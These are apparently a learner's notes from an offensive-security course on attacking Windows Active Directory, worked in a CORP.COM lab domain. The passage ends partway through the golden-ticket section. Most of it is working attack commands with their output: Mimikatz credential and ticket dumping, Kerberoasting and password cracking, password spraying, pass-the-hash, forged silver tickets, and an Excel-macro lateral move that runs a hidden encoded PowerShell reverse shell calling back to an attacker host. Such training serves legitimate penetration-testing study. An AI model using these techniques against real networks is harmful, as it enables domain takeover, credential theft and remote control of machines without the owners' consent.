style="color:#ffff00;">$Searcher.filter=&quot;(objectClass=Group)&quot; # gets all groups</span></strong><br /><br /><br /># <strong><span style="color:#ffff00;">$Searcher.filter=&quot;(name=Nested_Group)&quot; # filter by name</span></strong><br /><br />$Result = $Searcher.FindAll()<br /><br />Foreach($obj in $Result)<br />{<br />    $obj.Properties.name<br />}</div><div class='page'><h1 class='title level-3'>Enum Active Users</h1><br/>Import-Module .\PowerView.ps1<br /><br /><strong><span style="color:#060f94;">Retrieve active users on local computer:</span></strong><br />Get-NetLoggedon -ComputerName client251<br /><br /><br /><strong><span style="color:#060f94;">Retrieve active users on dc01 domain controller:</span></strong><br /><br />Get-NetSession -ComputerName dc01</div><div class='page'><h1 class='title level-3'>Enum SPNs</h1><br/>$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()<br /><br />$PDC = ($domainObj.PdcRoleOwner).Name<br /><br />$SearchString = &quot;LDAP://&quot;<br />$SearchString += $PDC + &quot;/&quot;<br /><br />$DistinguishedName = &quot;DC=$($domainObj.Name.Replace(&#39;.&#39;, &#39;,DC=&#39;))&quot;<br /><br />$SearchString += $DistinguishedName<br /><br />$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)<br /><br />$objDomain = New-Object System.DirectoryServices.DirectoryEntry<br /><br />$Searcher.SearchRoot = $objDomain<br /><br /><strong><span style="color:#ffff00;">$Searcher.filter=&quot;serviceprincipalname=*http*&quot;</span></strong> # Filters http services<br /><br />$Result = $Searcher.FindAll()<br /><br />Foreach($obj in $Result)<br />{<br />    Foreach($prop in $obj.Properties)<br />    {<br />        $prop<br />    }<br />}</div><div class='page'><h1 class='title level-2'>AD Auth</h1><br/></div><div class='page'><h1 class='title level-3'>NTLM Auth</h1><br/><strong><h2>NTLM Authentication</h2></strong><br />NTLM authentication is used when a client authenticates to a server by IP address (instead of by hostname),1 or if the user attempts to authenticate to a hostname that is not registered on the Active Directory integrated DNS server. Likewise, third-party applications may choose to use NTLM authentication instead of Kerberos authentication.<br /><br />The NTLM authentication protocol consists of seven steps as shown in Figure 3 and explained in depth below.<br /><br /><img src="images/112-1.png" alt="images/112-1.png" /><br />Figure 3: Diagram of NTLM authentication in Active Directory</div><div class='page'><h1 class='title level-3'>Kerberos Auth</h1><br/><a href="https://portal.offensive-security.com/courses/pen-200/books-and-videos/modal/modules/active-directory-attacks/active-directory-authentication/kerberos-authentication">https://portal.offensive-security.com/courses/pen-200/books-and-videos/modal/modules/active-directory-attacks/active-directory-authentication/kerberos-authentication</a><br /><br /><strong><h2>Kerberos Authentication</h2></strong><br />The Kerberos authentication protocol used by Microsoft is adopted from the Kerberos version 5 authentication protocol created by MIT and has been used as Microsoft&#39;s primary authentication mechanism since Windows Server 2003. While NTLM authentication works through a principle of challenge and response, Windows-based Kerberos authentication uses a ticket system.<br /><br />At a high level, Kerberos client authentication to a service in Active Directory involves the use of a domain controller in the role of a key distribution center, or KDC.1 This process is shown in Figure 4.,<br /><br /><img src="images/113-1.png" alt="images/113-1.png" /></div><div class='page'><h1 class='title level-3'>Cached Credential Storage and Retrieval</h1><br/>C:\Tools\active_directory&gt; mimikatz.exe<br /><br /><span style="color:#060f94;">mimikatz # privilege::debug</span><br />Privilege &#39;20&#39; OK<br /><br /><span style="color:#060f94;">mimikatz # sekurlsa::logonpasswords</span><br /><br />Authentication Id : 0 ; 291668 (00000000:00047354)<br />Session           : Interactive from 1<br />User Name         : Offsec<br />Domain            : CORP<br />Logon Server      : DC01<br />Logon Time        : 08/02/2018 14.23.26<br />SID               : S-1-5-21-1602875587-2787523311-2599479668-1103<br />        msv :<br />         [00000003] Primary<br />         \* Username : Offsec<br />         \* Domain   : CORP<br />         \* NTLM     : e2b475c11da2a0748290d87aa966c327<br />         \* SHA1     : 8c77f430e4ab8acb10ead387d64011c76400d26e<br />         \* DPAPI    : 162d313bede93b0a2e72a030ec9210f0<br />        tspkg :<br />        wdigest :<br />         \* Username : Offsec<br />         \* Domain   : CORP<br />         \* Password : (null)<br />        kerberos :<br />         \* Username : Offsec<br />         \* Domain   : CORP.COM<br />         \* Password : (null)<br />...<br /><br /><br /> in Listing 30, we use Mimikatz to show the Offsec user&#39;s tickets that are stored in memory:<br /> <br /><span style="color:#060f94;">mimikatz # sekurlsa::tickets</span><br /><br />Authentication Id : 0 ; 291668 (00000000:00047354)<br />Session           : Interactive from 1<br />User Name         : Offsec<br />Domain            : CORP<br />Logon Server      : DC01<br />Logon Time        : 08/02/2018 14.23.26<br />SID               : S-1-5-21-1602875587-2787523311-2599479668-1103<br /><br /> * Username : Offsec<br /> * Domain   : CORP.COM<br /> * Password : (null)<br /><br />Group 0 - Ticket Granting Service<br /> [00000000]<br />   Start/End/MaxRenew: 09/02/2018 14.41.47 ; 10/02/2018 00.41.47 ; 16/02/2018 14.41.47<br />   Service Name (02) : cifs ; dc01 ; @ CORP.COM<br />   Target Name  (02) : cifs ; dc01 ; @ CORP.COM<br />   Client Name  (01) : Offsec ; @ CORP.COM<br />   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ;<br />   Session Key       : 0x00000012 - aes256_hmac<br />     d062a1b8c909544a7130652fd4bae4c04833c3324aa2eb1d051816a7090a0718<br />   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]<br /><br />Group 1 - Client Ticket ?<br /><br /><span style="color:#060f94;">Group 2 - Ticket Granting Ticket</span><br /> [00000000]<br />   Start/End/MaxRenew: 09/02/2018 14.41.47 ; 10/02/2018 00.41.47 ; 16/02/2018 14.41.47<br />   Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM<br />   Target Name  (--) : @ CORP.COM<br />   Client Name  (01) : Offsec ; @ CORP.COM ( $$Delegation Ticket$$ )<br />   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwa<br />   Session Key       : 0x00000012 - aes256_hmac<br />     3b0a49af17a1ada1dacf2e3b8964ad397d80270b71718cc567da4d4b2b6dc90d<br />   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]<br /> [00000001]<br />   Start/End/MaxRenew: 09/02/2018 14.41.47 ; 10/02/2018 00.41.47 ; 16/02/2018 14.41.47<br />   Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM<br />   Target Name  (02) : krbtgt ; CORP.COM ; @ CORP.COM<br />   Client Name  (01) : Offsec ; @ CORP.COM ( CORP.COM )<br />   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forward<br />   Session Key       : 0x00000012 - aes256_hmac<br />     8f6e96a7067a86d94af4e9f46e0e2abd067422fe7b1588db37c199f5691a749c<br />   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]<br />...<br /><br />The output shows both a TGT and a TGS. Stealing a TGS would allow us to access only particular resources associated with those tickets. On the other side, armed with a TGT ticket, we could request a TGS for specific resources we want to target within the domain. We will discuss how to leverage stolen or forged tickets later on in the module.</div><div class='page'><h1 class='title level-3'>Service Account Attacks</h1><br/>We can call the KerberosRequestorSecurityToken constructor by specifying the SPN with the -ArgumentList option as shown in Listing 31.<br /><br /><span style="color:#060f94;">Add-Type -AssemblyName System.IdentityModel<br />New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &#39;HTTP/CorpWebServer.corp.com&#39;</span><br /><br />After execution, the requested service ticket should be generated by the domain controller and loaded into the memory of the Windows 10 client. Instead of executing Mimikatz all the time, we can also use the built-in klist5 command to display all cached Kerberos tickets for the current user:<br /><br />PS C:\Users\offsec.CORP&gt; <span style="color:#060f94;">klist</span><br /><br />Current LogonId is 0:0x3dedf<br /><br />Cached Tickets: (4)<br /><br />#0&gt;	Client: Offsec @ CORP.COM<br />	Server: krbtgt/CORP.COM @ CORP.COM<br />	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96<br />	Ticket Flags 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicaliz<br />	Start Time: 2/12/2018 10:17:53 (local)<br />	End Time:   2/12/2018 20:17:53 (local)<br />	Renew Time: 2/19/2018 10:17:53 (local)<br />	Session Key Type: AES-256-CTS-HMAC-SHA1-96<br />	Cache Flags: 0x1 -&gt; PRIMARY <br />	Kdc Called: DC01.corp.com<br /><br />#1&gt;	Client: Offsec @ CORP.COM<br />	Server: HTTP/CorpWebServer.corp.com @ CORP.COM<br />	KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)<br />	Ticket Flags 0x40a50000 -&gt; forwardable renewable pre_authent ok_as_delegate name_cano<br />	Start Time: 2/12/2018 10:18:31 (local)<br />	End Time:   2/12/2018 20:17:53 (local)<br />	Renew Time: 2/19/2018 10:17:53 (local)<br />	Session Key Type: RSADSI RC4-HMAC(NT)<br />	Cache Flags: 0 <br />	Kdc Called: DC01.corp.com<br />...<br /><br />With the service ticket for the Internet Information Services service principal name created and saved to memory (Listing 32), we can download it from memory using either built-in APIs6 or Mimikatz.<br /><br />To download the service ticket with Mimikatz, we use the kerberos::list command, which yields the equivalent output of the klist command above. We also specify the /export flag to download to disk as shown in Listing 33.<br /><br /><span style="color:#060f94;">mimikatz # kerberos::list /export</span><br /><br />[00000000] - 0x00000012 - aes256_hmac<br />   Start/End/MaxRenew: 12/02/2018 10.17.53 ; 12/02/2018 20.17.53 ; 19/02/2018 10.17.53<br />   Server Name       : krbtgt/CORP.COM @ CORP.COM<br />   Client Name       : Offsec @ CORP.COM<br />   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forward<br />   \* Saved to file     : 0-40e10000-Offsec@krbtgt~CORP.COM-CORP.COM.kirbi<br /><br />[00000001] - 0x00000017 - rc4_hmac_nt<br />   Start/End/MaxRenew: 12/02/2018 10.18.31 ; 12/02/2018 20.17.53 ; 19/02/2018 10.17.53<br />   Server Name       : HTTP/CorpWebServer.corp.com @ CORP.COM<br />   Client Name       : Offsec @ CORP.COM<br />   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ;<br /><span style="color:#060f94;">   \* Saved to file     : 1-40a50000-offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi</span><br />   <br />   <br />   <br />According to the Kerberos protocol, the service ticket is encrypted using the SPN&#39;s password hash. If we are able to request the ticket and decrypt it using brute force or guessing (in a technique known as <strong><span style="color:#c061cb;">Kerberoasting</span></strong>), we will know the password hash, and from that we can crack the clear text password of the service account. As an added bonus, we do not need administrative privileges for this attack.<br /><br />Let&#39;s try this out. To perform a wordlist attack, we must first install the kerberoast package with apt and then run tgsrepcrack.py, supplying a wordlist and the downloaded service ticket:<br /><br /><span style="color:#ed333b;">Note that the service ticket file is binary. Keep this in mind when transferring it with a tool like Netcat, which may mangle it during transfer.</span><br /><br /><span style="color:#060f94;">kali@kali:~$ sudo apt update &amp;&amp; sudo apt install kerberoast<br />...<br />kali@kali:~$ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi </span><br />found password for ticket 0: Qwerty09!  File: 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi<br />All tickets cracked!</div><div class='page'><h1 class='title level-3'>SprayPasswords</h1><br/>/usr/share/powershell-empire/empire/server/data/module_source/credentials/DomainPasswordSpray.ps1<br /><br /><span style="color:#060f94;">PS C:\Tools\active_directory&gt; .\Spray-Passwords.ps1 -Pass Qwerty09! -Admin</span><br />WARNING: also targeting admin accounts.<br />Performing brute force - press [q] to stop the process and print results...<br />Guessed password for user: &#39;Administrator&#39; = &#39;Qwerty09!&#39;<br />Guessed password for user: &#39;offsec&#39; = &#39;Qwerty09!&#39;<br />Guessed password for user: &#39;adam&#39; = &#39;Qwerty09!&#39;<br />Guessed password for user: &#39;iis_service&#39; = &#39;Qwerty09!&#39;<br />Guessed password for user: &#39;sql_service&#39; = &#39;Qwerty09!&#39;<br />Stopping bruteforce now....<br />Users guessed are:<br /> &#39;Administrator&#39; with password: &#39;Qwerty09!&#39;<br /> &#39;offsec&#39; with password: &#39;Qwerty09!&#39;<br /> &#39;adam&#39; with password: &#39;Qwerty09!&#39;<br /> &#39;iis_service&#39; with password: &#39;Qwerty09!&#39;<br /> &#39;sql_service&#39; with password: &#39;Qwerty09!&#39;</div><div class='page'><h1 class='title level-2'>AD Lateral Movement</h1><br/></div><div class='page'><h1 class='title level-3'>Pass the Hash</h1><br/><strong><h3>Pass the Hash</h3></strong><br />The Pass the Hash (PtH) technique allows an attacker to authenticate to a remote system or service using a user&#39;s NTLM hash instead of the associated plaintext password. Note that this will not work for Kerberos authentication but only for server or service using NTLM authentication.<br /><br /><span style="color:#ed333b;">This technique requires an SMB connection through the firewall (commonly port 445), and the Windows File and Print Sharing feature to be enabled. These requirements are common in internal enterprise environments.</span><br /><br />To demonstrate this, we can use pth-winexe from the Passing-The-Hash toolkit, just as we did when we passed the hash to a non-domain joined user in the Password Attacks module:<br /><br />(<a href="file:///usr/bin/pth-winexe">/usr/bin/pth-winexe</a>)<br /><br /><span style="color:#060f94;">kali@kali:~$ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd</span><br />E_md4hash wrapper called.<br />HASH PASS: Substituting user supplied NTLM HASH...<br />Microsoft Windows [Version 10.0.16299.309]<br />(c) 2017 Microsoft Corporation. All rights reserved.<br /><br />C:\Windows\system32&gt;</div><div class='page'><h1 class='title level-3'>Overpass the Hash</h1><br/>Overpass the Hash<br />With overpass the hash, we can &quot;over&quot; abuse a NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT) or service ticket, which grants us access to another machine or service as that user.<br /><br /><br /><span style="color:#060f94;">mimikatz # sekurlsa::logonpasswords</span><br /><br />Authentication Id : 0 ; 2815531 (00000000:002af62b)<br />Session           : Interactive from 0<br />User Name         : jeff_admin<br />Domain            : CORP<br />Logon Server      : DC01<br />Logon Time        : 12/02/2018 09.18.57<br />SID               : S-1-5-21-1602875587-2787523311-2599479668-1105<br />        msv :<br />         [00000003] Primary<br />         \* Username : jeff_admin<br />         \* Domain   : CORP<br />         <span style="color:#060f94;">\* NTLM     : e2b475c11da2a0748290d87aa966c327</span><br />         \* SHA1     : 8c77f430e4ab8acb10ead387d64011c76400d26e<br />         \* DPAPI    : 2918ad3d4607728e28ccbd76eab494b9<br />        tspkg :<br />        wdigest :<br />         \* Username : jeff_admin<br />         \* Domain   : CORP<br />         \* Password : (null)<br />        kerberos :<br />         \* Username : jeff_admin<br />         \* Domain   : CORP.COM<br />         \* Password : (null)<br />...<br /><br /><span style="color:#c061cb;">The essence of the overpass the hash technique is to turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication</span>. A simple way to do this is again with the sekurlsa::pth command from Mimikatz.<br /><br /><span style="color:#060f94;">mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe</span><br />user    : jeff_admin<br />domain  : corp.com<br />program : cmd.exe<br />impers. : no<br />NTLM    : e2b475c11da2a0748290d87aa966c327<br />  |  PID  4832<br />  |  TID  2268<br />  |  LSA Process is now R/W<br />  |  LUID 0 ; 1197687 (00000000:00124677)<br />  \_ msv1_0   - data copy @ 040E5614 : OK !<br />  \_ kerberos - data copy @ 040E5438<br />   \_ aes256_hmac       -&gt; null<br />   \_ aes128_hmac       -&gt; null<br />   \_ rc4_hmac_nt       OK<br />   \_ rc4_hmac_old      OK<br />   \_ rc4_md4           OK<br />   \_ rc4_hmac_nt_exp   OK<br />   \_ rc4_hmac_old_exp  OK<br />   \_ *Password replace -&gt; null<br /><br />At this point, we have a new PowerShell session that allows us to execute commands as Jeff_Admin.<br /><br />Let&#39;s list the cached Kerberos tickets with klist:<br /><br /><span style="color:#060f94;">PS C:\Windows\system32&gt; klist</span><br /><br />Current LogonId is 0:0x1583ae<br /><br />Cached Tickets: (0)<br /><br /><span style="color:#c061cb;">No Kerberos tickets have been cached, but this is expected since Jeff_Admin has not performed an interactive login. However, let&#39;s generate a TGT by authenticating to a network share on the domain controller with net use:</span><br /><br /><span style="color:#060f94;">PS C:\Windows\system32&gt; net use \\dc01</span><br />The command completed successfully.<br /><br /><span style="color:#060f94;">PS C:\Windows\system32&gt; klist</span><br /><br />Current LogonId is 0:0x1583ae<br /><br />Cached Tickets: (3)<br /><br />#0&gt; Client: jeff_admin @ CORP.COM<br />    Server: krbtgt/CORP.COM @ CORP.COM<br />    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96<br />    Ticket Flags 0x60a10000 -&gt; forwardable forwarded renewable pre_authent name_canoni<br />    Start Time: 2/12/2018 13:59:40 (local)<br />    End Time:   2/12/2018 23:59:40 (local)<br />    Renew Time: 2/19/2018 13:59:40 (local)<br />    Session Key Type: AES-256-CTS-HMAC-SHA1-96<br />    Cache Flags: 0x2 -&gt; DELEGATION<br />    Kdc Called: DC01.corp.com<br /><br />#1&gt; Client: jeff_admin @ CORP.COM<br />    Server: krbtgt/CORP.COM @ CORP.COM<br />    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96<br />    Ticket Flags 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonica<br />    Start Time: 2/12/2018 13:59:40 (local)<br />    End Time:   2/12/2018 23:59:40 (local)<br />    Renew Time: 2/19/2018 13:59:40 (local)<br />    Session Key Type: AES-256-CTS-HMAC-SHA1-96<br />    Cache Flags: 0x1 -&gt; PRIMARY<br />    Kdc Called: DC01.corp.com<br /><br />#2&gt; Client: jeff_admin @ CORP.COM<br />    Server: cifs/dc01 @ CORP.COM<br />    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96<br />    Ticket Flags 0x40a50000 -&gt; forwardable renewable pre_authent ok_as_delegate name_c<br />    Start Time: 2/12/2018 13:59:40 (local)<br />    End Time:   2/12/2018 23:59:40 (local)<br />    Renew Time: 2/19/2018 13:59:40 (local)<br />    Session Key Type: AES-256-CTS-HMAC-SHA1-96<br />    Cache Flags: 0<br />    Kdc Called: DC01.corp.com<br />    <br />    <span style="color:#c061cb;">We used &quot;net use&quot; arbitrarily in this example but we could have used any command that requires domain permissions and would subsequently create a TGS.</span><br />  <br />  <br /><span style="color:#e66100;">(/usr/share/powershell-empire/empire/server/data/module_source/lateral_movement/Invoke-PsExec.ps1) might work</span><br />Let&#39;s try that now, running ./PsExec.exe to launch cmd.exe remotely on the \dc01 machine as Jeff_Admin:<br />PS C:\Tools\active_directory&gt; .\PsExec.exe \\dc01 cmd.exe<br /><br />PsExec v2.2 - Execute processes remotely<br />Copyright (C) 2001-2016 Mark Russinovich<br />Sysinternals - <a href="http://www.sysinternals.com">www.sysinternals.com</a><br /><br />C:\Windows\system32&gt; ipconfig<br /><br />Windows IP Configuration<br /><br />Ethernet adapter Ethernet0:<br /><br />   Connection-specific DNS Suffix  . :<br />   Link-local IPv6 Address . . . . . : fe80::7959:aaad:eec:3969%2<br />   IPv4 Address. . . . . . . . . . . : 192.168.1.110<br />   Subnet Mask . . . . . . . . . . . : 255.255.255.0<br />   Default Gateway . . . . . . . . . : 192.168.1.1<br />...<br /><br />C:\Windows\system32&gt; whoami<br />corp\jeff_admin</div><div class='page'><h1 class='title level-3'>Pass the Ticket</h1><br/><strong><h3>Pass the Ticket</h3></strong><br />In the previous section, we used the overpass the hash technique (along with the captured NTLM hash) to acquire a Kerberos TGT, allowing us to authenticate using Kerberos. We can only use the TGT on the machine it was created for, but the TGS potentially offers more flexibility.<br /><br />The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.<br /><br />So far, this attack does not provide us with any additional access, but it does offer flexibility in being able to choose which machine to use the ticket from. However, if a service is registered with a service principal name, this scenario becomes more interesting.<br /><br />Previously, we demonstrated that we could crack the service account password hash and obtain the password from the service ticket. This password could then be used to access resources available to the service account.<br /><br />However, if the service account is not a local administrator on any servers, we would not be able to perform lateral movement using vectors such as pass the hash or overpass the hash and therefore, in these cases, we would need to use a different approach.<br /><br />As with Pass the Hash, Overpass the Hash also requires access to the special admin share called Admin$, which in turn requires local administrative rights on the target machine.<br /><br />Remembering the inner workings of the Kerberos authentication, the application on the server executing in the context of the service account checks the user&#39;s permissions from the group memberships included in the service ticket. The user and group permissions in the service ticket are not verified by the application though. The application blindly trusts the integrity of the service ticket since it is encrypted with a password hash - in theory - only known to the service account and the domain controller.<br /><br />As an example, if we authenticate against an IIS server that is executing in the context of the service account iis_service, the IIS application will determine which permissions we have on the IIS server depending on the group memberships present in the service ticket.<br /><br />However, with the service account password or its associated NTLM hash at hand, we can forge our own service ticket to access the target resource (in our example the IIS application) with any permissions we desire. This custom-created ticket is known as a silver ticket1 and if the service principal name is used on multiple servers, the silver ticket can be leveraged against them all.<br /><br /><span style="color:#c061cb;">Mimikatz can craft a silver ticket and inject it straight into memory through the (somewhat misleading) kerberos::golden command.</span> We will explain this apparent misnaming later in the module.<br /><br />To create the ticket, we first need the obtain the so-called Security Identifier or SID3 of the domain. A SID is an unique name for any object in Active Directory and has the following structure:<br /><br />S-R-I-S<br />E.g.<br />S-1-5-21-2536614405-3629634762-1218571035-1116<br /><br />C:\&gt;whoami /user<br /><br />USER INFORMATION<br />----------------<br /><br />User Name   SID<br />=========== ==============================================<br />corp\offsec S-1-5-21-1602875587-2787523311-2599479668-1103<br /><br /><br /><br />The SID defining the domain is the entire string except the RID at the end ( -1103 ) as highlighted in Listing 48.<br /><br />Now that we have the domain SID, let&#39;s try to craft a silver ticket for the IIS service we previously discovered in our dedicated lab domain.<br /><br />The silver ticket command requires a username (/user), domain name (/domain), the domain SID (/sid), which is highlighted above, the fully qualified host name of the service (/target), the service type (/service:HTTP), and the password hash of the iis_service service account (/rc4).<br /><br />Finally, the generated silver ticket is injected directly into memory with the /ptt flag.<br /><br />Before running this, we will flush any existing Kerberos tickets with kerberos::purge and verify the purge with kerberos::list:<br /><br /><br /><span style="color:#060f94;">mimikatz # kerberos::purge</span><br />Ticket(s) purge for current session is OK<br /><br /><span style="color:#060f94;">mimikatz # kerberos::list</span><br /><br /><br /><strong><span style="color:#c061cb;"># Does not create a golden ticket as the name suggests, this is a silver ticket!</span></strong><br /><span style="color:#060f94;">mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt</span><br />User      : offsec<br />Domain    : corp.com (CORP)<br />SID       : S-1-5-21-1602875587-2787523311-2599479668<br /><strong><span style="color:#ed333b;">User Id   : 500<br />Groups Id : \*513 512 520 518 519</span></strong><br />ServiceKey: e2b475c11da2a0748290d87aa966c327 - rc4_hmac_nt<br />Service   : HTTP<br />Target    : CorpWebServer.corp.com<br />Lifetime  : 13/02/2018 10.18.42 ; 11/02/2028 10.18.42 ; 11/02/2028 10.18.42<br />-&gt; Ticket : \*\* Pass The Ticket \*\*<br /><br /> \* PAC generated<br /> \* PAC signed<br /> \* EncTicketPart generated<br /> \* EncTicketPart encrypted<br /> \* KrbCred generated<br /><br />Golden ticket for &#39;offsec @ corp.com&#39; successfully submitted for current session<br /><br /><span style="color:#060f94;">mimikatz # kerberos::list</span><br /><br />[00000000] - 0x00000017 - rc4_hmac_nt<br />   Start/End/MaxRenew: 13/02/2018 10.18.42 ; 11/02/2028 10.18.42 ; 11/02/2028 10.18.42<br />   Server Name       : HTTP/CorpWebServer.corp.com @ corp.com<br />   Client Name       : offsec @ corp.com<br />   Flags 40a00000    : pre_authent ; renewable ; forwardable ;<br />   <br />   <br />As shown by the output in Listing 49, a new service ticket for the SPN HTTP/CorpWebServer.corp.com has been loaded into memory and Mimikatz set appropriate group membership permissions in the forged ticket. From the perspective of the IIS application, the current user will be both the built-in local administrator ( Relative Id: 500 ) and a member of several highly-privileged groups, including the Domain Admins group (as highlighted above).<br /><br />To create a silver ticket, we use the password hash and not the cleartext password. If a kerberoast session presented us with the cleartext password, we must hash it before using it to generate a silver ticket.<br /><br />Now that we have this ticket loaded into memory, we can interact with the service and gain access to any information based on the group memberships we put in the silver ticket. Depending on the type of service, it might also be possible to obtain code execution.</div><div class='page'><h1 class='title level-3'>Distributed Component Object Model</h1><br/><strong><span style="color:#060f94;">Excel Macro Attack</span></strong><br /><br /><a href="https://portal.offensive-security.com/courses/pen-200/books-and-videos/modal/modules/active-directory-attacks/active-directory-lateral-movement/distributed-component-object-model">https://portal.offensive-security.com/courses/pen-200/books-and-videos/modal/modules/active-directory-attacks/active-directory-lateral-movement/distributed-component-object-model</a><br /><br />$Path = &quot;\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop&quot;<br /><br />$temp = [system.io.directory]::createDirectory($Path)<br /><br /><br />$com = [activator]::CreateInstance([type]::GetTypeFromProgId(&quot;Excel.Application&quot;, &quot;192.168.1.110&quot;))<br /><br />$LocalPath = &quot;C:\Users\jeff_admin.corp\myexcel.xls&quot;<br /><br />$RemotePath = &quot;\\192.168.1.110\c$\myexcel.xls&quot;<br /><br />[System.IO.File]::Copy($LocalPath, $RemotePath, $True)<br /><br />$Path = &quot;\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop&quot;<br /><br />$temp = [system.io.directory]::createDirectory($Path)<br /><br />$Workbook = $com.Workbooks.Open(&quot;C:\myexcel.xls&quot;)<br /><br />$com.Run(&quot;mymacro&quot;)<br /><br /><br /><br /><strong><span style="color:#060f94;">Create evil script</span></strong><br />kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta<br />No platform was selected, choosing Msf::Module::Platform::Windows from the payload<br />No Arch selected, selecting Arch: x86 from the payload<br />No encoder or badchars specified, outputting raw payload<br />Payload size: 324 bytes<br />Final size of hta-psh file: 6461 bytes<br />Saved as: evil.hta<br /><br /><br /><br /><strong><span style="color:#060f94;">Listing 60 - Python script to split Base64 encoded string</span></strong><br />str = &quot;powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ.....&quot;<br /><br />n = 50<br /><br />for i in range(0, len(str), n):<br />	print &quot;Str = Str + &quot; + &#39;&quot;&#39; + str[i:i+n] + &#39;&quot;&#39;<br /><br /><strong><span style="color:#060f94;">Macro</span></strong><br />Sub mymacro()<br />    Dim Str As String<br />    <br />    Str = Str + &quot;powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad&quot;<br />    Str = Str + &quot;ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA&quot;<br />    ...<br />    Str = Str + &quot;EQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHM&quot;<br />    Str = Str + &quot;AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA=&quot;<br />    Shell (Str)<br />End Sub<br /><br /><br /><strong><span style="color:#060f94;">Before executing the macro, we&#39;ll start a Netcat listener on the Windows 10 client to accept the reverse command shell from the domain controller:</span></strong><br />PS C:\Tools\practical_tools&gt; nc.exe -lvnp 4444<br /><br />listening on [any] 4444 ...<br />connect to [192.168.1.111] from (UNKNOWN) [192.168.1.110] 59121<br />Microsoft Windows [Version 10.0.14393]<br />(c) 2016 Microsoft Corporation. All rights reserved.<br /><br />C:\Windows\system32&gt; <br /><br /><strong><span style="color:#f66151;">While the attack requires access to both </span></strong><strong><span style="color:#57e389;">TCP 135</span></strong><strong><span style="color:#f66151;"> for DCOM and </span></strong><strong><span style="color:#57e389;">TCP 445 </span></strong><strong><span style="color:#f66151;">for SMB, this is a relatively new vector for lateral movement and may avoid some detection systems such as Network Intrusion Detection or host-based antivirus.</span></strong></div><div class='page'><h1 class='title level-2'>AD Persistence</h1><br/></div><div class='page'><h1 class='title level-3'>Golden Tickets</h1><br/><strong><h3>Golden Tickets</h3></strong><br />Going back to the explanation of Kerberos authentication, we recall that when a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This secret key is actually the password hash of a domain user account called <strong><span style="color:#f66151;">krbtgt</span></strong>.<br /><br />If we are able to get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, or golden tickets.<br /><br />For example, we could create a TGT stating that a non-privileged user is actually a member of the Domain Admins group, and the domain controller will trust it since it is correctly encrypted.<br /><br /><br /><strong><span style="color:#237522;">At this stage of the engagement, we should have access to an account that is a member of the Domain Admins group or we have compromised the domain controller itself.</span></strong><br /><br />With this kind of access, we can extract the password hash of the krbtgt account with Mimikatz.<br /><br />To simulate this, we&#39;ll log in to the domain controller via remote desktop using the jeff_admin account, run Mimikatz from the C:\Tools folder, and issue the lsadump::lsa command as displayed below:<br /><br /><strong><span style="color:#060f94;">mimikatz # privilege::debug</span></strong><br />Privilege &#39;20&#39; OK<br /><br />mimikatz # lsadump::lsa /patch<br />Domain : CORP / S-1-5-21-1602875587-2787523311-2599479668<br /><br />RID  : 000001f4 (500)<br />User : Administrator<br />LM   :<br />NTLM : e2b475c11da2a0748290d87aa966c327<br /><br />RID  : 000001f5 (501)<br />User : Guest<br />LM   :<br />NTLM :<br /><br />RID  : 000001f6 (502)<br />User : krbtgt<br />LM   :<br />NTLM : 75b60230a2394a812000dbfad8415965<br /><br />Before generating the golden ticket, we&#39;ll delete any existing Kerberos tickets with <strong><span style="color:#060f94;">kerberos::purge</span></strong>.<br /><br />We&#39;ll supply the domain SID (which we can gather with <strong><span style="color:#060f94;">whoami /user</span></strong>) to the Mimikatz <strong><span style="color:#060f94;">kerberos::golden</span></strong> command to create the golden ticket. This time we&#39;ll use the<strong><span style="color:#060f94;"> /krbtgt 